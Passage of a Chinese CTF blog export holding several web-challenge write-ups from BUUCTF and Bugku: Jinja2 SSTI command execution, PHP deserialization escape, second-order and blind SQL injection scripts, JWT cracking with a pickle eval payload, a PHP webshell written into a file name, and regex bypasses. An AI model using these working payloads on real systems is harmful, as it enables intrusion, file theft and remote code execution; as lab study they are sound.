    <content type="text"><![CDATA[考点jinja2的ssti注入 解题过程打开 在源代码中 通过下面payload判断是否存在模板注入 1?search=&#123;&#123;4*4&#125;&#125; 确定漏洞类型存在模板注入 试了常规的命令执行payload，发现都是返回500服务器错误。 1&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;ls&apos;).read()&quot;)&#125;&#125; 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &apos;eval&apos; in b.keys() %&#125; &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&apos;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif %&#125;&#123;% endfor %&#125; 无奈之下，找到一名大师傅写的脚本 12345678910111213141516171819202122import requestsimport reimport htmlimport timeindex = 0for i in range(170, 1000): try: url = "http://d08b15b4-f7c1-4129-9083-3fc9d50a2c5f.node4.buuoj.cn:81?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]&#125;&#125;" r = requests.get(url) res = re.findall("&lt;h2&gt;You searched for:&lt;\/h2&gt;\W+&lt;h3&gt;(.*)&lt;\/h3&gt;", r.text) time.sleep(0.1) # print(res) # print(r.text) res = html.unescape(res[0]) print(str(i) + " | " + res) if "subprocess.Popen" in res: index = i break except: continueprint("indexo of subprocess.Popen:" + str(index)) 这个脚本的功能是查找可以执行命令的类，查找条件subprocess.Popen。 接下来通过大师傅给的payload 12345?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125; 成功打通。 总结对模板注入还不够了解，不会构造payload，更不会bypass，只能拿着别人的payload或者工具来做题，这类题得多做，payload要会自己构造。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSTI(jinja2)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【bugku-WEB】 newphp]]></title>
    <url>%2F2021%2F08%2F08%2Fbugku-newphp%2F</url>
    <content type="text"><![CDATA[考点反序列化字符串逃逸 ssrf 解题思路分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?php// php版本:5.4.44header("Content-type: text/html; charset=utf-8");highlight_file(__FILE__);class evil&#123; public $hint; public function __construct($hint)&#123; $this-&gt;hint = $hint; &#125; public function __destruct()&#123; if($this-&gt;hint==="hint.php") @$this-&gt;hint = base64_encode(file_get_contents($this-&gt;hint)); var_dump($this-&gt;hint); &#125; function __wakeup() &#123; if ($this-&gt;hint != "╭(●｀∀´●)╯") &#123; //There's a hint in ./hint.php $this-&gt;hint = "╰(●’◡’●)╮"; &#125; &#125;&#125;class User&#123; public $username; public $password; public function __construct($username, $password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125;&#125;function write($data)&#123; global $tmp; $data = str_replace(chr(0).'*'.chr(0), '\0\0\0', $data); $tmp = $data;&#125;function read()&#123; global $tmp; $data = $tmp; $r = str_replace('\0\0\0', chr(0).'*'.chr(0), $data); return $r;&#125;$tmp = "test";$username = $_POST['username'];$password = $_POST['password'];$a = serialize(new User($username, $password));if(preg_match('/flag/is',$a)) die("NoNoNo!");unserialize(read(write($a))); 一般看到有unserialize函数，基本上就知道是反序列化类型的题，审计代码的时候首先找到利用的点。 在evil类的__destruct方法中 12345678public function __destruct()&#123; # $this-&gt;hint 必须为hint.php if($this-&gt;hint==="hint.php") # 读取文件hint.php内容 并且base64编码 重新赋值给$this-&gt;hint @$this-&gt;hint = base64_encode(file_get_contents($this-&gt;hint)); # 输出 var_dump($this-&gt;hint); &#125; 目的很明确，我们需要通过反序列化evil类来读取hint.php文件查看提示，先在自己搭建环境构造序列化字符串。 得到反序列化字符串 1O:4:&quot;evil&quot;:1:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125; 找到可以执行反序列化的地方。 123456789$tmp = "test";$username = $_POST['username'];$password = $_POST['password'];$a = serialize(new User($username, $password));if(preg_match('/flag/is',$a)) die("NoNoNo!");unserialize(read(write($a))); 可以看到这里并不能直接对evil类进行序列化，首先POST接收了两个参数，然后通过两个参数创建了User类，并且进行了序列化，最后通过write和read函数进行替换后才进行反序列化。 关键点就在这两个函数，这两个函数是造成字符串逃逸的关键因素。 12345678910111213function write($data)&#123; global $tmp; $data = str_replace(chr(0).'*'.chr(0), '\0\0\0', $data); $tmp = $data;&#125;function read()&#123; global $tmp; $data = $tmp; $r = str_replace('\0\0\0', chr(0).'*'.chr(0), $data); return $r;&#125;# write方法会将 带有*的字符串替换成 \0\0\0 而read方法则相反，会将\0\0\0 替换成* 可以看到\0\0\0会被替换成*，那在反序列化之前使用这两个函数会有什么问题呢？ 首先通过username和password 进行传参，并把刚刚序列化得到的字符串传入进去。 如果直接这样传入进去，后边的O:4:&quot;evil&quot;:1:{s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;}就会被丢弃，O:4:&quot;User&quot;:2 。O代表着对象，4代表对象名的字符长度，User就是对象名，2就代表着有两个属性，2个属性就只会读取O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:3:&quot;123&quot;;s:8:&quot;password&quot;;， 后边的就会被丢弃。 这里我们可以利用字符串替换进行逃逸，我们传入一组 \00\00\00 没被替换前得到 1O:4:"User":2:&#123;s:8:"username";s:6:"\0\0\0";s:8:"password";s:41:"O:4:"evil":1:&#123;s:4:"hint";s:8:"hint.php";&#125;";&#125; 经过write和read替换后 1O:4:"User":2:&#123;s:8:"username";s:6:"*";s:8:"password";s:41:"O:4:"evil":1:&#123;s:4:"hint";s:8:"hint.php";&#125;";&#125; 可以发现变成了s:6:&quot;*&quot;; 这样会意味着 这里要吃掉 *&quot;;s:8 变成 *&quot;;s:8 ，但是后边没有闭合，所以会出错。如果我们想逃逸出O:4:&quot;evil&quot;:1:{s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;}&quot;;}，那就必须吃掉 &quot;;s:8:&quot;password&quot;;s:41:&quot;这23个字符，而一组\0\0\0 能吃掉三个，这三个字符由chr(0).&#39;*&#39;.chr(0) 组成的三个，那么就需要8组\0\0\0 ，这样就得到24个，另外再由password加上一个任意字符凑齐24个，将evil的属性个数改为2绕过__wakeup方法检测。 payload 1username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a";O:4:"evil":2:&#123;s:4:"hint";s:8:"hint.php";&#125; 得到base64编码的字符串 12345PD9waHAKICRoaW50ID0gImluZGV4LmNnaSI7CiAvLyBZb3UgY2FuJ3Qgc2VlIG1lfgo=解码&lt;?php $hint = &quot;index.cgi&quot;; // You can&apos;t see mefgo 访问index.cgi ssrf 获取flag的payload 1http://114.67.246.176:17691/index.cgi?name=%20file:///flag]]></content>
      <categories>
        <category>CTF</category>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【CISCN2019 华北赛区 Day1 Web5】CyberPunk 1]]></title>
    <url>%2F2021%2F05%2F11%2F%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5%5DCyberPunk%201%2F</url>
    <content type="text"><![CDATA[考点：文件包含、二次注入、sql注入读取文件这道题本来打算自己折腾出来的，把源代码包含出来后，一直审计，起初，根本没发现是二次注入，一直在想办法绕过addslashes 和 怎么绕过正则，正则过滤了很多sql注入的关键字，只能检测有sql注入漏洞，但根本不可能查到数据。就是在这上面下的功夫比较多。最后才发现，文件change.php 有一个查询sql语句，带入查询的sql语句关键字被过滤了，在查询出来的基础上，紧接着有一条更新语句，更新语句是有一个条件是从数据库中取出，也就是$row[&#39;address&#39;] ，然后找到这个$row[&#39;address&#39;] 插入的地方，也就是首页index.php ，后台处理是 confirm.php， 发现没有处理 $address，于是就知道这个题考的二次注入。知道以后，可以查询表名，字段名，就是查不到字段值，网上找个了遍，群里也问了哪些大佬，都没有得到结果，最后才看来wp，发现flag根本不在数据库中，而是在 /falg.txt 中，简直人傻了。 分析主页上一个关键的地方，可以用文件包含出几个文件的源代码。 payload 1?file=php://filter/read=convert.base64-encode/resource=index.php confirm.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &apos;&apos;; $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;; $user_name = $_POST[&quot;user_name&quot;]; # 这里接收address $address = $_POST[&quot;address&quot;]; $phone = $_POST[&quot;phone&quot;]; # if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &apos;no sql inject!&apos;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&apos;&#123;$user_name&#125;&apos; and `phone`=&apos;&#123;$phone&#125;&apos;&quot;; $fetch = $db-&gt;query($sql); &#125; if($fetch-&gt;num_rows&gt;0) &#123; $msg = $user_name.&quot;å·²æäº¤è®¢å&quot;; &#125;else&#123; # 这里会将address 插入到数据库中 # 这里使用了预处理 不存在sql注入 $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;; $re = $db-&gt;prepare($sql); $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone); $re = $re-&gt;execute(); if(!$re) &#123; echo &apos;error&apos;; print_r($db-&gt;error); exit; &#125; $msg = &quot;è®¢åæäº¤æå&quot;; &#125;&#125; else &#123; $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;&#125;?&gt; change.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &apos;&apos;; $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;; $user_name = $_POST[&quot;user_name&quot;]; # 这里会接收 address 参数 特殊字符会被addslashes 转义 $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &apos;no sql inject!&apos;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&apos;&#123;$user_name&#125;&apos; and `phone`=&apos;&#123;$phone&#125;&apos;&quot;; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); # 这里会把刚接收的 address 更新 到 address 字段中 # 会把查询出来的address 更新到 old_address 字段中 # 这里传入的 address 已经被 addslashes 构造不了 单引号闭合 # 而这里的 $row[&apos;address&apos;] 是从数据库中取出 # 而刚刚的confirm.php文件并没有处理address 参数 # 这里会存在二次注入 $sql = &quot;update `user` set `address`=&apos;&quot;.$address.&quot;&apos;, `old_address`=&apos;&quot;.$row[&apos;address&apos;].&quot;&apos; where `user_id`=&quot;.$row[&apos;user_id&apos;]; $result = $db-&gt;query($sql); if(!$result) &#123; echo &apos;error&apos;; print_r($db-&gt;error); exit; &#125; $msg = &quot;è®¢åä¿®æ¹æå&quot;; &#125; else &#123; $msg = &quot;æªæ¾å°è®¢å!&quot;; &#125;&#125;else &#123; $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;&#125;?&gt; 贴了两个关键文件的代码，总共有四个功能提交订单 查询订单 修改订单 删除订单 漏洞出现在提交订单 和 修改订单当中，直接构造payload。 payload 查数据库 1aa' or updatexml(2,concat(0x7e,(database())),0) or' 加载flag文件 1aa' or updatexml(2,concat(0x7e,(select load_file('/flag.txt'))),0) or' 读不完 一次 1234# 一次aa' or updatexml(2,concat(0x7e,(select substr(load_file('/flag.txt'),10,40))),0) or'# 两次aa' or updatexml(2,concat(0x7e,(select substr(load_file('/flag.txt'),20,50))),0) or' 测试把查数据库的payload提交上去 再修改订单信息 成功的拿到了数据库名 接下来直接读flag，为什么不是放在数据库中，我也是不断的读取字段名，读了差不多20多个字段名，一直读不完，才去看别人wp，发现要用load_file 去读 /flag.txt 文件。 提交 修改 拿到flag，但是并没有全拿到。 再读一次，就拿到后半段。 1aa' or updatexml(2,concat(0x7e,(select substr(load_file('/flag.txt'),20,50))),0) or' update 注入：https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8insert%EF%BC%8Cupdate%E5%92%8Cdelete%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件包含</tag>
        <tag>二次注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【Zer0pts2020】Can you guess it 1]]></title>
    <url>%2F2021%2F05%2F06%2F%5BZer0pts2020%5DCan%20you%20guess%20it%201%2F</url>
    <content type="text"><![CDATA[考点：代码审计、正则绕过、basename缺陷打开123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpinclude &apos;config.php&apos;; // FLAG is defined in config.phpif (preg_match(&apos;/config\.php\/*$/i&apos;, $_SERVER[&apos;PHP_SELF&apos;])) &#123; exit(&quot;I don&apos;t know what you are thinking, but I won&apos;t let you read it :)&quot;);&#125;if (isset($_GET[&apos;source&apos;])) &#123; highlight_file(basename($_SERVER[&apos;PHP_SELF&apos;])); exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&apos;guess&apos;])) &#123; $guess = (string) $_POST[&apos;guess&apos;]; if (hash_equals($secret, $guess)) &#123; $message = &apos;Congratulations! The flag is: &apos; . FLAG; &#125; else &#123; $message = &apos;Wrong.&apos;; &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;Can you guess it?&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Can you guess it?&lt;/h1&gt; &lt;p&gt;If your guess is correct, I&apos;ll give you the flag.&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt; &lt;hr&gt;&lt;?php if (isset($message)) &#123; ?&gt; &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;&lt;?php &#125; ?&gt; &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 分析题目直接给出了源代码，通过分析，可以得到两段代码。先看看下半段。 123456789101112# 随机生成64位二进制字节，再转换位十六进制 赋值给$secret$secret = bin2hex(random_bytes(64));if (isset($_POST['guess'])) &#123; $guess = (string) $_POST['guess']; # hash_equals 可防止时序攻击的字符串比较 # 如果传入字符串长度和随机生成的字符串长度不一样 直接 false if (hash_equals($secret, $guess)) &#123; $message = 'Congratulations! The flag is: ' . FLAG; &#125; else &#123; $message = 'Wrong.'; &#125;&#125; 这段代码，是想让我们传入字符串，要求字符串与随机生成的字符串一样，那么才会输出flag。几乎不太可能。 分析上半段代码。 1234567891011# $_SERVER['PHP_SELF'] 是获取url中域名后边的部分 www.xxx.com/index.php/config.php 就是获取 index.php/config.php# 这里的正则直接就是匹配 config.php/ 不允许这样的结尾 if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) &#123; exit("I don't know what you are thinking, but I won't let you read it :)");&#125;# 如果传入的是 /index.php/config.php 那么 basename 取到的就是config.php if (isset($_GET['source'])) &#123; highlight_file(basename($_SERVER['PHP_SELF'])); exit();&#125; 如果通过highlight_file去读取config.php 文件，这段代码看起来好像是不太行，通过传入 /index.php/config.php 会被正则直接拦下来。但是basename 这个函数有个小小的问题，就是文件名首尾任何非ASCII码的字符都会被rename函数删除掉。官网https://bugs.php.net/bug.php?id=62119。 12345678910111213141516171819$path='/test/äaä.txt';echo $path."\n";setlocale(LC_ALL,'C');echo dirname($path).'/'.basename($path)."\n";setlocale(LC_ALL,'en_US.iso885915'); // bash: locale -aecho dirname($path).'/'.basename($path)."\n";Expected result:----------------/test/äaä.txt/test/äaä.txt/test/äaä.txtActual result:--------------/test/äaä.txt/test/aä.txt/test/äaä.txt 构造payload 1/index.php/config.php/%e4/?source 首先浏览器会去请求index.php这个文件，正则会匹配/index.php/config.php/%e4/ ，末尾不满足正则表达式的规则，不会被拦截，到rename这，会把%e4，也就是 ä，这个非ASCII码字符丢弃掉，只会拿到config.php，所以highlight_file就成功读取到了config.php文件 得到]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CTF</tag>
        <tag>preg_match绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【CISCN2019 华北赛区 Day1 Web2】ikun 1]]></title>
    <url>%2F2021%2F04%2F29%2F%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun%201%2F</url>
    <content type="text"><![CDATA[考点：JWT伪造爆破页面爆破页面的方式查找lv6.png 1234567891011import requestsfor i in range(1,500): url = "http://c3b3fa1b-d3f7-46e3-87aa-cd780610904c.node3.buuoj.cn/shop?page=%d"%(i) resp = requests.get(url, timeout=10) if "lv6.png" in resp.text: print("[+]" + str(i)) break print(i)# page=181 找到 JWT伪造要伪造JWT，首先要知道密钥，通过工具 jwt-cracker 下载连接：https://github.com/brendan-rius/c-jwt-cracker 12└─$ ./jwtcrack &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.l0qG4XbJbemqJXsaITaT8g78fkJ-boRvU2H7H1CY644&quot;Secret is &quot;1Kun&quot; 打开 https://jwt.io/ python反序列化序列化构建payload 12345678910import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, ("open('/flag.txt', 'r').read()",)) a = pickle.dumps(payload())a = urllib.quote(a)print a 1c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%20%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A. 这道题，在没看wp之前，我以为是需要用1000块钱把所有的商品买光，把资金筹集够，然后会有相应提示或者输出flag。在优惠折扣那存在一个漏洞，可以修改值大小。修改得越小，花的钱就越少，就通过burp suite 得 intruder 购买了所有商品，结果发现还是回显什么。总之，这道题很多知识点都超出了我的认知。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化(Python)</tag>
        <tag>JWT伪造</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【CISCN2019 总决赛 Day2 Web1】Easyweb 1]]></title>
    <url>%2F2021%2F04%2F25%2F%5BCISCN2019%20%E6%80%BB%E5%86%B3%E8%B5%9B%20Day2%20Web1%5DEasyweb%201%2F</url>
    <content type="text"><![CDATA[考点：备份文件泄漏、sql盲注、绕过php字符文件上传打开 一个普普通通的登录框，查看源代码，图片是通过请求 image.php?id=1 的方式得到的。测试了下，好像只会显示图片和不显示图片，只要发现有登录框的题，都会测试sql注入，和扫目录。sql注入，没有明显报错，扫描目录的结果如下。 发现 robots.txt image.php.bak 关键信息 打开 robots.txt 关键信息 *.php.bak 下载 image.php.bak 得到一份image.php 的源码 1234567891011121314151617181920&lt; ?phpinclude "config.php";$id=isset($_GET["id"])?$_GET["id"]:"1";$path=isset($_GET["path"])?$_GET["path"]:"";# addslashes$id=addslashes($id);$path=addslashes($path);# 一般 addslashes 和 str_replace 放在一起 有可能照成 某些字符逃逸# str_replace 将 字符串中带有 \0 %00 \' \ 替换成 '$id=str_replace(array("\\0","%00","\\'","'"),"",$id);$path=str_replace(array("\\0","%00","\\'","'"),"",$path);$result=mysqli_query($con,"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path="./" . $row["path"];header("Content-Type: image/jpeg");readfile($path); 简化代码 12345678910&lt;?php $id = $_GET['code']; //\0' echo $id; echo "&lt;br/&gt;"; $id = addslashes($id); // \\0\' echo "addslashes:".$id; # \0 为结束符 空字符 \ ' 替换成 '' $id = str_replace(array("\\0", "%00", "\\'", "'"), "", $id); echo '&lt;br/&gt;'; echo $id; 1234567// $code=&apos;&apos;addslashes:\&apos;// $code=\0addslashes:\\0\ 当我输入 \0 ，addslashes函数会将 \0 转换成 \\0 ， 在经过str_replace的替换 ，就会逃逸出一个\。这个斜杠会照成什么危害呢，接下来把这个\ 拼接到sql语句中。 12345# $result=mysqli_query($con,"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);# 拼接逃逸的 \ 后 $result=mysqli_query($con,"select * from images where id='\' or path='&#123;$path&#125;'"); 可以看到 &quot;select * from images where id=&#39;\&#39; or path=&#39;{$path}&#39;&quot; 中的 &#39; 被转义 成了 \&#39;，id的值就变成了 \&#39; or path= ，后面的 $path 可控。 直接构建payload 1?id=\0&amp;path= or 1=1 --+ 完整的sql查询语句 1select * from images where id='\' or path=' or 1=1 --+' id值成了 \&#39; or path= 可控部分为 or 1=1 --+ --+ 注释掉了后面单引号。 需要注意的地方是 or 前边需要留一个空格，不然会挨在id值后面，导致语法失效。 接下来进行利用 sql盲注构建payload 12345678# 查表名or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=%s)--+[+] image,users# 查列名or (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x7573657273)),1,1))=%s)--+# 0x7573657273 是 字符串转16进制的 users 因为过滤了 ' [+] username,password# 查值 上脚本 1234567891011121314151617181920212223242526272829303132import requestsurl='http://d8d00e0d-6636-4e83-a4fb-fb6078f71755.node3.buuoj.cn/image.php?id=\\0&amp;path='flag=''for i in range(50): a = 32 b = 128 mid = (a+b)//2 while(a&lt;b): # or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%s)--+ 爆表名 # or (ascii(substr((select(group_concat(column_name)))from(information_schema.columns)where(table_name=0x7573657273)),%d,1))&gt;%s)--+ 爆列名 # print(mid) payload = url+"or (ascii(substr((select(group_concat(username,password))from(users)),%d,1))&gt;%s)--+"%(i,mid) import time time.sleep(1) re = requests.get(url=payload) # 首先判断目标值 是否小于 if 'JFIF' in re.text: a = mid + 1 else: # 目标值 大于 则直接 将 mid 赋值给 b b = mid mid = (a+b)//2 # if (mid==32|mid==128): break flag +=chr(mid) print("[+] " + flag) 还是别人写的脚本优雅，自己写的要提交两次。 结果 用户名 admin 密码 abd0ad13f4eed251de2c 登录 绕过php字符文件上传，文件名写马经过几经尝试，可以上传除php以外的文件，就是传入的文件名和后缀中不能存在 php，上传后不会给上传到的文件路径，但是会回显下边这样的一个记录。 打开 这个文件记录了上传的文件名。 那么思路就是，通过修改上传文件的文件名为一句话木马，然后访问这个文件进行利用，这里的文件名不能存在 php 字样，用php短标签代替。 一个小知识 PHP开启short_open_tag=on，即可使用短标签 payload 1&lt;=eval($_POST['cmd']);?&gt; 访问]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>备份文件泄露</tag>
        <tag>SQL盲注</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【FBCTF2019】RCEService 1]]></title>
    <url>%2F2021%2F04%2F24%2F%5BFBCTF2019%5DRCEService%201%2F</url>
    <content type="text"><![CDATA[考点：正则PCRE回溯匹配绕过、换行绕过打开 123456789101112131415161718192021222324&lt;?php# 设置当前php文件运行的环境变量putenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) &#123; $json = $_REQUEST['cmd']; if (!is_string($json)) &#123; echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; &#125; elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) &#123; echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; &#125; else &#123; echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo 'Invalid input'; &#125; echo '&lt;br/&gt;&lt;br/&gt;'; &#125;&#125;?&gt; 这道题有些问题，源码是从别人wp来的，但是别人也没说源码怎么来的。 不管怎么样，这道题学到了绕过preg_match正则匹配的两种方式。 第一种方式 PCRE回溯绕过 p神讲得很好https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html 这里直接贴脚本 123456789import requestsurl = "http://3f0c0ea0-47c8-4ae8-8f1c-dcd5c21ec12d.node3.buuoj.cn"payload = '&#123;"cmd": "/bin/cat /home/rceservice/flag", "zz": "'+"a"*(1000000)+'"&#125;'res = requests.post(url, data=&#123;"cmd": payload&#125;, timeout=10)print(res.text) 第二种方式 换行绕过 payload 12POST：cmd=&#123;%0a&quot;cmd&quot;%3a+&quot;/bin/cat+/home/rceservice/flag&quot;%0a&#125; 这道题处于懵懂状态。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CTF</tag>
        <tag>preg_match绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【WUSTCTF2020】颜值成绩查询 1]]></title>
    <url>%2F2021%2F04%2F22%2F%5BWUSTCTF2020%5D%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%201%2F</url>
    <content type="text"><![CDATA[考点：异或注入打开 测试 1^1^1 正常 1^0^1 错误 构造payload 12345678# 查表1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())), 1,1))&gt;0)^1# 查列1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')), 1,1))&gt;0)^1# 查数据1^(ord(substr((select(group_concat(flag,value))from(flag)), 1,1))&gt;0)^1 表名 1[+] flag,score 列名 1[+] flag,value 上脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import requestsimport timedef payload(url, i, mid): # 猜解单个字段值 payload = "1^(ord(substr((select(group_concat(value))from(flag)), %d,1))&gt;=%s)^1"%(i,mid) payload_url = url + payload # time.sleep(1) print(payload) resp = requests.get(payload_url) # 如果能够执行下列语句 则代表着 大于或等于 if "admin" in resp.text: # 再次进行判断 payload = "1^(ord(substr((select(group_concat(value))from(flag)), %d,1))=%s)^1"%(i,mid) payload_url = url + payload time.sleep(1) print(payload) resp = requests.get(payload_url) if "admin" in resp.text: # 拿到目标数 return 200 else: # 小于目标值 return 203 # 大于目标值 else: return 400def exp(url): column_value = "" for i in range(1,300): start = 33 end = 127 while start &lt;= end: mid = (start + end) // 2 res = payload(url,i,mid) print("[*] 返回码：" + str(res)) # 代表找到 if res == 200: print("[+] mid = "+str(mid)) column_value += chr(mid) break # 代表是小于字符ascii码值 elif res == 203: start = mid + 1 # 代表是大于 ascii码值 elif res == 400: end = mid - 1 print("[+] " + column_value) if __name__=='__main__': url = "http://2881a64e-02bf-4c71-b948-26b1a1e6c0ae.node3.buuoj.cn/?stunum=" exp(url)]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>异或注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【极客大挑战 2019】RCE ME 1]]></title>
    <url>%2F2021%2F04%2F22%2F%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME%201%2F</url>
